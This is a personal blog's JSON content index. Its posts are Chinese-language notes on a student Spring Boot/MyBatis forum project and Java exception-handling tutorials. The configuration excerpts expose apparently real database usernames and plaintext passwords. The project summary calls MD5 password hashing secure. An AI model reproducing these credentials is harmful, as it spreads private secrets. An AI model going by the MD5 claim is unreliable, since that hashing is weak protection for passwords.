{"meta":{"title":"mengnankk","subtitle":"","description":"天地不仁以万物为刍狗","author":"mengnankk","url":"https://mengnankk.top","root":"/"},"pages":[{"title":"友情链接","date":"2018-06-07T14:17:49.000Z","updated":"2023-11-14T02:44:39.657Z","comments":true,"path":"link/index.html","permalink":"https://mengnankk.top/link/index.html","excerpt":"","text":""}],"posts":[{"title":"java web bbs","slug":"bbs","date":"2024-06-05T16:00:00.000Z","updated":"2024-06-06T06:55:35.838Z","comments":true,"path":"2024/06/06/bbs/","permalink":"https://mengnankk.top/2024/06/06/bbs/","excerpt":"","text":"数据库根据实际情况选择数据库，选择的是mysql version 为 8.0.37 MySQL Community Server 在resources下application.properties文件里规定服务器的各类配置 服务器配置properties复制代码server.port=8080spring.thymeleaf.cache=false server.port=8080：指定Spring Boot应用运行的端口号为8080。 spring.thymeleaf.cache=false：禁用Thymeleaf模板的缓存，以便在开发过程中实时查看更改效果。 数据源配置properties复制代码spring.datasource.name=my-bbs-datasourcespring.datasource.driverClassName=com.mysql.cj.jdbc.Driverspring.datasource.url=jdbc:mysql://localhost:3306/my_bbs_db?useUnicode=true&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;allowMultiQueries=truespring.datasource.username=Margitspring.datasource.password=8750613a spring.datasource.name=my-bbs-datasource：数据源的名称。 spring.datasource.driverClassName=com.mysql.cj.jdbc.Driver：指定MySQL JDBC驱动。 spring.datasource.url=jdbc:mysql://localhost:3306/my_bbs_db?useUnicode=true&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;allowMultiQueries=true：数据库连接的URL，包含了字符编码、时区、SSL等配置。 spring.datasource.username=Margit：数据库用户名。 spring.datasource.password=8750613a：数据库密码。 HikariCP连接池配置properties复制代码spring.datasource.hikari.minimum-idle=5spring.datasource.hikari.maximum-pool-size=15spring.datasource.hikari.auto-commit=truespring.datasource.hikari.idle-timeout=60000spring.datasource.hikari.pool-name=hikariCPspring.datasource.hikari.max-lifetime=600000spring.datasource.hikari.connection-timeout=30000spring.datasource.hikari.connection-test-query=SELECT 1 spring.datasource.hikari.minimum-idle=5：连接池中最小空闲连接数。 spring.datasource.hikari.maximum-pool-size=15：连接池中最大连接数。 spring.datasource.hikari.auto-commit=true：设置自动提交。 spring.datasource.hikari.idle-timeout=60000：连接空闲时间（毫秒），超过该时间连接将被释放。 spring.datasource.hikari.pool-name=hikariCP：连接池名称。 spring.datasource.hikari.max-lifetime=600000：连接的最大生命周期（毫秒），超过该时间连接将被关闭。 spring.datasource.hikari.connection-timeout=30000：等待连接的最大时间（毫秒）。 spring.datasource.hikari.connection-test-query=SELECT 1：测试连接的SQL查询。 MyBatis配置properties复制代码mybatis.mapper-locations=classpath:mapper/*Mapper.xml mybatis.mapper-locations=classpath:mapper/*Mapper.xml：指定MyBatis的Mapper文件位置。 日志配置properties复制代码logging.level.com.my.bbs.dao=debug logging.level.com.my.bbs.dao=debug：设置包com.my.bbs.dao下的日志级别为debug，便于调试。 确保数据安全和防止数据丢失，要进行date的备份，使用mysqldump工具备份MySQL数据库： sh复制代码# 备份整个数据库mysqldump -u username -p database_name &gt; /path/to/backup/backup.sql# 备份所有数据库mysqldump -u username -p --all-databases &gt; /path/to/backup/all_databases.sql 管理工具在管理数据库的选择上，选择的是Navicat，可以有效的管理数据库。 sql文件包含了创建名为tb_bbs_post的MySQL表的结构。这个表用于存储论坛帖子的相关信息。每个帖子有一个唯一的主键post_id，以及发布者ID、帖子标题、内容等字段。 创建了名为tb_bbs_post的mysql表，用于存储帖子user的相关内容： 存储用户信息，包括登录名、密码、昵称、头像等。 每个用户有一个唯一的主键user_id。 login_name字段用于用户登录，password_md5字段存储密码的MD5加密值。 user_status字段表示用户状态，0表示正常，1表示禁言；is_admin字段表示用户是否为管理员。 last_login_time字段记录用户最后登录时间，create_time字段记录用户注册时间。 创建了名为tb_bbs_post的mysql表，用于存储帖子的post的内容 tb_post_category： 存储帖子分类信息，包括分类名称和排序值。 每个分类有一个唯一的主键category_id。 category_name字段存储分类名称，category_rank字段表示分类的排序值。 is_deleted字段表示分类是否被删除，0表示未删除，1表示已删除。 create_time字段记录分类创建时间。 tb_post_collect_record： 存储帖子收藏记录，包括帖子ID和用户ID。 每条记录有一个唯一的主键record_id。 post_id字段表示收藏的帖子ID，user_id字段表示收藏者的用户ID。 create_time字段记录收藏记录的创建时间。 tb_post_comment： 存储帖子评论信息，包括帖子ID、评论者ID、评论内容等。 每条评论有一个唯一的主键comment_id。 post_id字段表示评论所属的帖子ID，comment_user_id字段表示评论者的用户ID。 comment_body字段存储评论内容，parent_comment_user_id字段表示所回复的上一级评论的用户ID。 comment_create_time字段记录评论的创建时间，is_deleted字段表示评论是否被删除。 交互my_bbs_dbMapper.xml文件用来定义与数据库交互的SQL映射 其中的这个resultMap定义了数据库表到Java对象的映射关系。每个&lt;result&gt;标签指定了数据库列（column）与Java对象属性（property）之间的映射关系，以及列的JDBC类型（jdbcType）。这个resultMap扩展了BaseResultMap，添加了对大文本（BLOB）的支持，映射了post_content列。这个SQL片段定义了一个动态生成的WHERE子句，用于根据条件动态构建查询语句。&lt;foreach&gt;、&lt;if&gt;、&lt;choose&gt;等标签用来遍历条件并生成相应的SQL语句。这个SQL片段与Example_Where_Clause类似，但用于更新操作中的WHERE子句。Base_Column_List 和 Blob_Column_List 定义了基础列和BLOB列的列表，用于复用。 selectByExampleWithBLOBs 和 selectByExample 定义了查询方法，分别用于查询包含BLOB列和不包含BLOB列的数据。 这些查询方法根据参数动态生成SQL语句，包括distinct、WHERE子句和ORDER BY子句。 selectByExample 和 selectByPrimaryKey 定义了查询方法，分别用于根据条件和主键查询数据。 deleteByPrimaryKey 和 deleteByExample 定义了删除方法，分别用于根据主键和条件删除数据。 insert 和 insertSelective 定义了插入方法，分别用于插入完整记录和选择性插入记录。 countByExample 用于根据条件统计记录数量。 这些SQL映射定义了与数据库表tb_bbs_post的基本CRUD操作，利用MyBatis动态生成SQL语句，提高了代码的灵活性和可维护性。 countByExample 用于根据条件统计记录数量。 updateByExampleSelective 用于根据条件选择性地更新记录。 updateByExampleWithBLOBs 和 updateByExample 用于根据条件更新记录，分别包括和不包括BLOB字段。 updateByPrimaryKeySelective 和 updateByPrimaryKeyWithBLOBs 用于根据主键更新记录，分别选择性更新和更新所有字段。update方法更新所有字段，包括post_content。 updateByPrimaryKey方法更新所有字段，但不包括post_content。 这两个更新操作都是根据主键post_id进行的。 在这个文件中mybatisGeneratorConfig.xml用于生成与MyBatis ORM框架一起使用的Java对象和Mapper文件。根节点 xml复制代码&lt;generatorConfiguration&gt; 表示MyBatis Generator的配置文件开始。 xml复制代码&lt;context id=&quot;DB2Tables&quot; targetRuntime=&quot;MyBatis3&quot;&gt; id：上下文的标识符。 targetRuntime：指定生成代码的运行时环境，MyBatis3表示生成MyBatis 3.x兼容代码。 数据库连接配置xml复制代码&lt;jdbcConnection driverClass=&quot;com.mysql.jdbc.Driver&quot; connectionURL=&quot;jdbc:mysql://localhost:3306/my_bbs_db?serverTimezone=UTC&quot; userId=&quot;mengnankk&quot; password=&quot;Zyk2215290444&quot;&gt;&lt;/jdbcConnection&gt; driverClass：JDBC驱动类名。 connectionURL：数据库连接URL。 userId：数据库用户名。 password：数据库密码。 Java类型解析器xml复制代码&lt;javaTypeResolver&gt; &lt;property name=&quot;forceBigDecimals&quot; value=&quot;false&quot;/&gt;&lt;/javaTypeResolver&gt; 用于解析数据库类型到Java类型。 forceBigDecimals：设置为false表示不强制使用BigDecimal类型。 Java模型生成器xml复制代码&lt;javaModelGenerator targetPackage=&quot;com.my.bbs&quot; targetProject=&quot;src/main/java&quot;&gt; &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;trimStrings&quot; value=&quot;true&quot;/&gt;&lt;/javaModelGenerator&gt; targetPackage：生成的模型类包名。 targetProject：生成的模型类文件所在的项目路径。 enableSubPackages：设置为true表示支持子包。 trimStrings：设置为true表示自动去除字符串两端的空格。 SQL映射文件生成器xml复制代码&lt;sqlMapGenerator targetPackage=&quot;com.my.bbs&quot; targetProject=&quot;src/main/resources&quot;&gt; &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt;&lt;/sqlMapGenerator&gt; targetPackage：生成的SQL映射文件包名。 targetProject：生成的SQL映射文件所在的项目路径。 enableSubPackages：设置为true表示支持子包。 Java客户端生成器xml复制代码&lt;javaClientGenerator type=&quot;XMLMAPPER&quot; targetPackage=&quot;com.my.bbs&quot; targetProject=&quot;src/main/java&quot;&gt; &lt;property name=&quot;enableSubPackages&quot; value=&quot;true&quot;/&gt;&lt;/javaClientGenerator&gt; type：指定生成的Java客户端类型，XMLMAPPER表示生成XML映射文件的Mapper接口。 targetPackage：生成的Mapper接口包名。 targetProject：生成的Mapper接口所在的项目路径。 enableSubPackages：设置为true表示支持子包。 指定生成的表及对应的实体类xml复制代码&lt;table tableName=&quot;tb_bbs_user&quot; domainObjectName=&quot;my_bbs_db&quot;/&gt;&lt;table tableName=&quot;tb_bbs_post&quot; domainObjectName=&quot;my_bbs_db&quot;/&gt; tableName：指定数据库中的表名。 domainObjectName：指定生成的实体类名。 这个配置文件通过指定数据库连接、模型生成器、SQL映射文件生成器和Java客户端生成器等信息，生成与tb_bbs_user和tb_bbs_post表相关的Java对象和MyBatis Mapper文件。你可以添加更多的&lt;table&gt;节点来生成其他表的映射。 datemapperBBSPostCategory根节点xml复制代码&lt;mapper namespace=&quot;com.my.bbs.dao.BBSPostCategoryMapper&quot;&gt; 定义了该Mapper文件的命名空间，通常是对应的DAO接口的全限定名。 ResultMapxml复制代码&lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt; &lt;id column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;category_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryName&quot; /&gt; &lt;result column=&quot;category_rank&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryRank&quot; /&gt; &lt;result column=&quot;is_deleted&quot; jdbcType=&quot;TINYINT&quot; property=&quot;isDeleted&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt;&lt;/resultMap&gt; 定义了BBSPostCategory实体类与数据库表tb_post_category的映射关系。 SQL片段xml复制代码&lt;sql id=&quot;Base_Column_List&quot;&gt; category_id, category_name, category_rank, is_deleted, create_time&lt;/sql&gt; 定义了一个可重用的SQL片段，包含所有的列名。 根据主键查询xml复制代码&lt;select id=&quot;selectByPrimaryKey&quot; parameterType=&quot;java.lang.Integer&quot; resultMap=&quot;BaseResultMap&quot;&gt; select &lt;include refid=&quot;Base_Column_List&quot; /&gt; from tb_post_category where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;&lt;/select&gt; 根据category_id查询对应的记录。 查询所有未删除的类别xml复制代码&lt;select id=&quot;getBBSPostCategories&quot; resultMap=&quot;BaseResultMap&quot;&gt; select &lt;include refid=&quot;Base_Column_List&quot; /&gt; from tb_post_category where is_deleted = 0 order by category_rank desc&lt;/select&gt; 查询所有is_deleted字段为0的记录，并按category_rank降序排列。 删除操作xml复制代码&lt;delete id=&quot;deleteByPrimaryKey&quot; parameterType=&quot;java.lang.Integer&quot;&gt; delete from tb_post_category where category_id = #&#123;categoryId,jdbcType=INTEGER&#125;&lt;/delete&gt; 根据category_id删除对应的记录。 全字段插入xml复制代码&lt;insert id=&quot;insert&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt; insert into tb_post_category (category_id, category_name, category_rank, is_deleted, create_time) values (#&#123;categoryId,jdbcType=INTEGER&#125;, #&#123;categoryName,jdbcType=VARCHAR&#125;, #&#123;categoryRank,jdbcType=INTEGER&#125;, #&#123;isDeleted,jdbcType=TINYINT&#125;, #&#123;createTime,jdbcType=TIMESTAMP&#125;)&lt;/insert&gt; 插入一条新的记录，所有字段都必须提供值。 选择性插入xml复制代码&lt;insert id=&quot;insertSelective&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt; insert into tb_post_category &lt;trim prefix=&quot;(&quot; suffix=&quot;)&quot; suffixOverrides=&quot;,&quot;&gt; &lt;if test=&quot;categoryId != null&quot;&gt; category_id, &lt;/if&gt; &lt;if test=&quot;categoryName != null&quot;&gt; category_name, &lt;/if&gt; &lt;if test=&quot;categoryRank != null&quot;&gt; category_rank, &lt;/if&gt; &lt;if test=&quot;isDeleted != null&quot;&gt; is_deleted, &lt;/if&gt; &lt;if test=&quot;createTime != null&quot;&gt; create_time, &lt;/if&gt; &lt;/trim&gt; &lt;trim prefix=&quot;values (&quot; suffix=&quot;)&quot; suffixOverrides=&quot;,&quot;&gt; &lt;if test=&quot;categoryId != null&quot;&gt; #&#123;categoryId,jdbcType=INTEGER&#125;, &lt;/if&gt; &lt;if test=&quot;categoryName != null&quot;&gt; #&#123;categoryName,jdbcType=VARCHAR&#125;, &lt;/if&gt; &lt;if test=&quot;categoryRank != null&quot;&gt; #&#123;categoryRank,jdbcType=INTEGER&#125;, &lt;/if&gt; &lt;if test=&quot;isDeleted != null&quot;&gt; #&#123;isDeleted,jdbcType=TINYINT&#125;, &lt;/if&gt; &lt;if test=&quot;createTime != null&quot;&gt; #&#123;createTime,jdbcType=TIMESTAMP&#125;, &lt;/if&gt; &lt;/trim&gt; &lt;/insert&gt; 仅插入有值的字段。 选择性更新xml复制代码&lt;update id=&quot;updateByPrimaryKeySelective&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt; update tb_post_category &lt;set&gt; &lt;if test=&quot;categoryName != null&quot;&gt; category_name = #&#123;categoryName,jdbcType=VARCHAR&#125;, &lt;/if&gt; &lt;if test=&quot;categoryRank != null&quot;&gt; category_rank = #&#123;categoryRank,jdbcType=INTEGER&#125;, &lt;/if&gt; &lt;if test=&quot;isDeleted != null&quot;&gt; is_deleted = #&#123;isDeleted,jdbcType=TINYINT&#125;, &lt;/if&gt; &lt;if test=&quot;createTime != null&quot;&gt; create_time = #&#123;createTime,jdbcType=TIMESTAMP&#125;, &lt;/if&gt; &lt;/set&gt; where category_id = #&#123;categoryId,jdbcType=INTEGER&#125; &lt;/update&gt; 仅更新有值的字段。 全字段更新xml复制代码&lt;update id=&quot;updateByPrimaryKey&quot; parameterType=&quot;com.my.bbs.entity.BBSPostCategory&quot;&gt; update tb_post_category set category_name = #&#123;categoryName,jdbcType=VARCHAR&#125;, category_rank = #&#123;categoryRank,jdbcType=INTEGER&#125;, is_deleted = #&#123;isDeleted,jdbcType=TINYINT&#125;, create_time = #&#123;createTime,jdbcType=TIMESTAMP&#125; where category_id = #&#123;categoryId,jdbcType=INTEGER&#125; &lt;/update&gt; MyBatis Mapper好的，我们直接来分析这个MyBatis Mapper文件的功能和结构，而不再打印具体代码。 ResultMap: 定义了实体类与数据库表的映射关系。BaseResultMap 映射 record_id, post_id, user_id, create_time 到实体类的相应属性。 Base_Column_List: 定义了表中的列，以便在SQL查询中复用，减少重复代码。 selectByPrimaryKey: 通过主键 record_id 查询记录，返回单条记录映射到 BBSPostCollect 实体类。 selectByUserIdAndPostId: 根据 user_id 和 post_id 查询单条记录，用于检查特定用户是否收藏了特定帖子。 listByUserId: 根据 user_id 查询用户收藏的所有帖子，返回结果列表映射到 BBSPostCollect 实体类。 deleteByPrimaryKey: 根据主键 record_id 删除记录。 insert: 插入一条新的收藏记录，所有字段必须有值。 insertSelective: 插入一条新的收藏记录，允许部分字段为空，只插入非空字段。 updateByPrimaryKeySelective: 更新一条记录，根据主键 record_id 更新非空字段。 updateByPrimaryKey: 更新一条记录，根据主键 record_id 更新所有字段。 这个MyBatis Mapper文件定义了与 BBSPostCollect 实体类相关的数据库操作，具体包括查询、插入、更新和删除操作。它使用了 ResultMap 映射数据库表 tb_post_collect_record 的列与实体类属性之间的关系，并通过 Base_Column_List 片段复用列定义。 主要功能包括： selectByPrimaryKey：根据主键 record_id 查询记录。 selectByUserIdAndPostId：根据 user_id 和 post_id 查询单条记录，用于检查特定用户是否收藏了特定帖子。 listByUserId：根据 user_id 查询用户收藏的所有帖子。 deleteByPrimaryKey：根据主键 record_id 删除记录。 insert：插入一条新的收藏记录，所有字段必须有值。 insertSelective：插入一条新的收藏记录，允许部分字段为空。 updateByPrimaryKeySelective：根据主键 record_id 更新非空字段。 updateByPrimaryKey：根据主键 record_id 更新所有字段。 通过这些定义，可以实现对 tb_post_collect_record 表的基本CRUD操作，并且可以根据不同的条件进行查询和更新。 用于帖子评论相关的数据库操作的 MyBatis XML 配置文件。它包括了查询帖子评论列表、获取特定用户最近的评论列表、统计评论总数以及插入、更新和删除评论等功能。XML 文件中的各个元素定义了不同的数据库操作，通过 SQL 查询语句和参数映射关系来实现这些功能。 用于帖子评论相关的数据库操作的 MyBatis XML 配置文件。它包括了查询帖子评论列表、获取特定用户最近的评论列表、统计评论总数以及插入、更新和删除评论等功能。XML 文件中的各个元素定义了不同的数据库操作，通过 SQL 查询语句和参数映射关系来实现这些功能。 BBSPostCommentMapper.xml用于帖子评论相关的数据库操作的 MyBatis XML 配置文件。它包括了查询帖子评论列表、获取特定用户最近的评论列表、统计评论总数以及插入、更新和删除评论等功能。XML 文件中的各个元素定义了不同的数据库操作，通过 SQL 查询语句和参数映射关系来实现这些功能。 BBSPostMapper.xml这个 XML 文件是用于 MyBatis 的数据库映射配置，它定义了与帖子相关的数据库操作，主要包括： 结果映射（ResultMap）：定义了两个结果映射，BaseResultMap 和 ResultMapWithBLOBs，用于将数据库查询结果映射到实体类 BBSPost 的属性。 SQL 片段（SQL Fragments）：定义了两个 SQL 片段，Base_Column_List 和 Blob_Column_List，用于在查询语句中引用基本列和长文本列。 查询操作（Select Statements）：包括根据帖子ID查询帖子详细信息、根据一组帖子ID查询帖子列表、获取近一周内热门帖子列表、根据条件查询帖子列表和获取特定用户的帖子列表等。 插入、更新和删除操作（Insert, Update, Delete Statements）：定义了插入帖子、更新帖子信息和删除帖子等数据库操作。 BBSUserMapper.xml XML 文件是用于 MyBatis 的数据库映射配置，定义了与用户管理相关的数据库操作，主要包括： 结果映射（ResultMap）：定义了一个结果映射 BaseResultMap，用于将数据库查询结果映射到实体类 BBSUser 的属性。 SQL 片段（SQL Fragments）：定义了一个 SQL 片段 Base_Column_List，用于在查询语句中引用基本列。 查询操作（Select Statements）：包括根据用户ID查询用户详细信息、根据一组用户ID查询用户列表、根据登录名查询用户信息以及根据登录名和密码查询用户信息等。 插入、更新和删除操作（Insert, Update, Delete Statements）：定义了插入用户、更新用户信息和删除用户等数据库操作。 联系我：","categories":[{"name":"java","slug":"java","permalink":"https://mengnankk.top/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://mengnankk.top/tags/java/"}]},{"title":"BBS","slug":"webbbs","date":"2024-06-05T16:00:00.000Z","updated":"2024-06-11T03:10:08.610Z","comments":true,"path":"2024/06/06/webbbs/","permalink":"https://mengnankk.top/2024/06/06/webbbs/","excerpt":"","text":"学校学习交流论坛 1. 项目简介 项目名称：学校学习交流论坛 项目描述：本项目旨在创建一个功能全面、易于使用的在线论坛系统，用户可以注册、登录、发布帖子、评论、收藏以及查看热门话题。该系统采用 Spring Boot 框架进行开发，确保系统的高性能和可扩展性。 2. 项目采用技术 编程语言：JAVA HTML JavaScript CSS 框架和库：Spring Boot 数据库：8.0.37 MySQL Community Server 开发工具：IDEA2024.1 其他技术：Navicat Maven Git Github 3. 功能需求分析 用户注册与登录 个人资料管理 发布帖子和评论 帖子收藏 查看热门话题 4. 项目亮点 高性能：通过 Spring Boot 框架实现高效的请求处理。 易扩展性：模块化设计，便于功能扩展。 安全性：采用 MD5 加密用户密码，保障用户信息安全。 数据分析：提供帖子浏览量、评论量的统计功能，便于数据分析。 5. 系统演示 操作视频： 主要功能截图： 6. 团队成员负责模块 成员姓名 负责模块 主要贡献 周永康 数据库，安全模块，github管理模块 blog管理 张淏鸣 前端，用户管理，编码crypot模块 姚昭丞 帖子post模块，帖子管理模块，内容支持模块，创意模块 7. 项目 Git 地址 Git 仓库地址：https://github.com/mengnankkkk/worktest 仓库说明：用来存储源代码 8. 团队成员 Git 提交记录截图 截图展示：每个成员的 Git 提交记录截图 9. 项目总结 完成情况和成果：项目按计划完成，实现了预定的所有功能，并通过了系统测试。项目展示了团队成员在 Spring Boot 开发、前后端交互和数据库设计方面的能力。用户反馈良好，系统性能稳定，用户体验友好。 后续计划：未来我们计划继续优化系统性能，增加更多互动功能，如即时聊天、私信等。同时，将考虑引入人工智能技术，实现智能推荐和数据分析功能。 致谢：感谢所有团队成员的辛勤付出。","categories":[{"name":"bbs","slug":"bbs","permalink":"https://mengnankk.top/categories/bbs/"}],"tags":[{"name":"java maven","slug":"java-maven","permalink":"https://mengnankk.top/tags/java-maven/"}]},{"title":"java 中","slug":"java2","date":"2024-04-22T16:00:00.000Z","updated":"2024-06-06T06:11:33.767Z","comments":true,"path":"2024/04/23/java2/","permalink":"https://mengnankk.top/2024/04/23/java2/","excerpt":"","text":"java中级异常处理导致程序的正常流程被中断的事件，叫做异常 常见手段： try catch finally throws try catch将可能抛出FileNotFoundException 文件不存在异常的代码放在try里2.如果文件存在，就会顺序往下执行，并且不执行catch块中的代码\\3. 如果文件不存在，try 里的代码会立即终止，程序流程会运行到对应的catch块中\\4. e.printStackTrace(); 会打印出方法的调用痕迹，如此例，会打印出异常开始于TestException的第16行，这样就便于定位和分析到底哪里出了异常 package exception; import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException; public class TestException &#123; public static void main(String[] args) &#123; File f= new File(&quot;d:/LOL.exe&quot;); try&#123; System.out.println(&quot;试图打开 d:/LOL.exe&quot;); new FileInputStream(f); System.out.println(&quot;成功打开&quot;); &#125; catch(FileNotFoundException e)&#123; System.out.println(&quot;d:/LOL.exe不存在&quot;); e.printStackTrace(); &#125; &#125;&#125; 使用异常的父类进行catch也可以 多种异常可以分别解决 package exception; import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date; public class TestException &#123; public static void main(String[] args) &#123; File f = new File(&quot;d:/LOL.exe&quot;); try &#123; System.out.println(&quot;试图打开 d:/LOL.exe&quot;); new FileInputStream(f); System.out.println(&quot;成功打开&quot;); SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;); Date d = sdf.parse(&quot;2016-06-03&quot;); &#125; catch (FileNotFoundException e) &#123; System.out.println(&quot;d:/LOL.exe不存在&quot;); e.printStackTrace(); &#125; catch (ParseException e) &#123; System.out.println(&quot;日期格式解析错误&quot;); e.printStackTrace(); &#125; &#125;&#125; 也可以多个异常统一catch解决，但是不能知道是哪一个的问题 package exception; import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date; public class TestException &#123; public static void main(String[] args) &#123; File f = new File(&quot;d:/LOL.exe&quot;); try &#123; System.out.println(&quot;试图打开 d:/LOL.exe&quot;); new FileInputStream(f); System.out.println(&quot;成功打开&quot;); SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;); Date d = sdf.parse(&quot;2016-06-03&quot;); &#125; catch (FileNotFoundException | ParseException e) &#123; if (e instanceof FileNotFoundException) System.out.println(&quot;d:/LOL.exe不存在&quot;); if (e instanceof ParseException) System.out.println(&quot;日期格式解析错误&quot;); e.printStackTrace(); &#125; &#125;&#125; finally无论是否出现异常，finally中的代码都会被执行 package exception; import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException; public class TestException &#123; public static void main(String[] args) &#123; File f= new File(&quot;d:/LOL.exe&quot;); try&#123; System.out.println(&quot;试图打开 d:/LOL.exe&quot;); new FileInputStream(f); System.out.println(&quot;成功打开&quot;); &#125; catch(FileNotFoundException e)&#123; System.out.println(&quot;d:/LOL.exe不存在&quot;); e.printStackTrace(); &#125; finally&#123; System.out.println(&quot;无论文件是否存在， 都会执行的代码&quot;); &#125; &#125;&#125; throws方法考虑如下情况：主方法调用method1method1调用method2method2中打开文件 method2中需要进行异常处理但是method2不打算处理，而是把这个异常通过throws****抛出去那么method1就会接到该异常。 处理办法也是两种，要么是try catch处理掉，要么也是抛出去。method1选择本地try catch住 一旦try catch住了，就相当于把这个异常消化掉了，主方法在调用method1的时候，就不需要进行异常处理了 package exception; import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException; public class TestException &#123; public static void main(String[] args) &#123; method1(); &#125; private static void method1() &#123; try &#123; method2(); &#125; catch (FileNotFoundException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; private static void method2() throws FileNotFoundException &#123; File f = new File(&quot;d:/LOL.exe&quot;); System.out.println(&quot;试图打开 d:/LOL.exe&quot;); new FileInputStream(f); System.out.println(&quot;成功打开&quot;); &#125;&#125; throws与throw这两个关键字接近，不过意义不一样，有如下区别：\\1. throws 出现在方法声明上，而throw通常都出现在方法体内。\\2. throws 表示出现异常的一种可能性，并不一定会发生这些异常；throw则是抛出了异常，执行throw则一定抛出了某个异常对象。 异常分类 可查异常，运行时异常和错误3种其中，运行时异常和错误又叫非可查异常 可查异常CheckedException可查异常即必须进行处理的异常，要么try catch住,要么往外抛，谁调用，谁处理，比如 FileNotFoundException如果不处理，编译器，就不让你通过 运行时异常RuntimeException指： 不是必须进行try catch的异常 常见运行时异常:除数不能为0异常:ArithmeticException下标越界异常:ArrayIndexOutOfBoundsException空指针异常:NullPointerException在编写代码的时候，依然可以使用try catch throws进行处理，与可查异常不同之处在于，即便不进行try catch，也不会有编译错误Java之所以会设计运行时异常的原因之一，是因为下标越界，空指针这些运行时异常太过于普遍，如果都需要进行捕捉，代码的可读性就会变得很糟糕。 package exception; public class TestException &#123; public static void main(String[] args) &#123; //任何除数不能为0:ArithmeticException int k = 5/0; //下标越界异常：ArrayIndexOutOfBoundsException int j[] = new int[5]; j[10] = 10; //空指针异常：NullPointerException String str = null; str.length(); &#125;&#125; 错误错误Error，指的是系统级别的异常，通常是内存用光了在默认设置下，一般java程序启动的时候，最大可以使用16m的内存如例不停的给StringBuffer追加字符，很快就把内存使用光了。抛出OutOfMemoryError与运行时异常一样，错误也是不要求强制捕捉的 代码比较复制代码 Throwable是类，Exception和Error都继承了该类所以在捕捉的时候，也可以使用Throwable进行捕捉如图： 异常分Error和ExceptionException里又分运行时异常和可查异常。 package exception; import java.io.File;import java.io.FileInputStream; public class TestException &#123; public static void main(String[] args) &#123; File f = new File(&quot;d:/LOL.exe&quot;); try &#123; new FileInputStream(f); //使用Throwable进行异常捕捉 &#125; catch (Throwable t) &#123; // TODO Auto-generated catch block t.printStackTrace(); &#125; &#125;&#125; 应用： public class TestException &#123; public static void main(String[] args) &#123; method1(); /*int a= getresult(); System.out.println(a);*/ &#125; public static void method() throws Throwable &#123; File f=new File(&quot;d:/lol&quot;); new FileInputStream(f); &#125; public static void method1() &#123; try &#123; method(); &#125; catch (Throwable e) &#123; e.printStackTrace(); &#125; &#125; public static int getresult()&#123; File f=new File(&quot;d:/&quot;); try &#123; new FileInputStream(f); return 1; &#125;catch (FileNotFoundException e)&#123; e.printStackTrace(); return 2; &#125;finally &#123; return 3; &#125; &#125; 自定义异常1.创建一个类EnemyHeroIsDeadException，并继承Exception提供两个构造方法\\1. 无参的构造方法\\2. 带参的构造方法，并调用父类的对应的构造方法 class EnemyHeroIsDeadException extends Exception&#123; public EnemyHeroIsDeadException()&#123; &#125; public EnemyHeroIsDeadException(String msg)&#123; super(msg); &#125;&#125; package charactor; public class Hero &#123; public String name; protected float hp; public void attackHero(Hero h) throws EnemyHeroIsDeadException&#123; if(h.hp == 0)&#123; throw new EnemyHeroIsDeadException(h.name + &quot; 已经挂了,不需要施放技能&quot; ); &#125; &#125; public String toString()&#123; return name; &#125; class EnemyHeroIsDeadException extends Exception&#123; public EnemyHeroIsDeadException()&#123; &#125; public EnemyHeroIsDeadException(String msg)&#123; super(msg); &#125; &#125; public static void main(String[] args) &#123; Hero garen = new Hero(); garen.name = &quot;盖伦&quot;; garen.hp = 616; Hero teemo = new Hero(); teemo.name = &quot;提莫&quot;; teemo.hp = 0; try &#123; garen.attackHero(teemo); &#125; catch (EnemyHeroIsDeadException e) &#123; // TODO Auto-generated catch block System.out.println(&quot;异常的具体原因:&quot;+e.getMessage()); e.printStackTrace(); &#125; &#125;&#125; JAVA 的FILE类，以及常用方法创建文件对象package file; import java.io.File; public class TestFile &#123; public static void main(String[] args) &#123; // 绝对路径 File f1 = new File(&quot;d:/LOLFolder&quot;); System.out.println(&quot;f1的绝对路径：&quot; + f1.getAbsolutePath()); // 相对路径,相对于工作目录，如果在eclipse中，就是项目目录 File f2 = new File(&quot;LOL.exe&quot;); System.out.println(&quot;f2的绝对路径：&quot; + f2.getAbsolutePath()); // 把f1作为父目录创建文件对象 File f3 = new File(f1, &quot;LOL.exe&quot;); System.out.println(&quot;f3的绝对路径：&quot; + f3.getAbsolutePath()); &#125;&#125;","categories":[{"name":"java","slug":"java","permalink":"https://mengnankk.top/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://mengnankk.top/tags/java/"}]},{"title":"java basic","slug":"java1","date":"2024-04-22T16:00:00.000Z","updated":"2024-06-06T06:11:27.353Z","comments":true,"path":"2024/04/23/java1/","permalink":"https://mengnankk.top/2024/04/23/java1/","excerpt":"","text":"java basic1.面对对象1.类和对象 属性，即可以设置的一些属性 方法即可以进行的一些行为 